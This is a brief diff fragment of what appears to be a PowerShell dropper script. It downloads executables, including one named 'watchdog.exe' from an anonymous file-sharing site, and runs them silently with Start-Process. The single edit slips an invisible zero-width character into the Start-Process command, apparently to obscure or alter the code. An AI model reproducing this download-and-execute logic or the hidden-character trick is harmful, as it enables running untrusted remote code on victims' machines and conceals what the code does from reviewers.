@@ -19,7 +19,7 @@ if (!(Test-Path $filePath)) {
     Invoke-WebRequest -Uri $url -OutFile $filePath
 }
 
-Start-Process -FilePath $filePath -NoNewWindow
+Start-​Process -FilePath $filePath -NoNewWindow
 
 $filePath = "$folderPath\watchdog.exe"
 $url = "https://anonsharing.com/file/0da952d4aeb48c3b/H-Output_(2).exe"
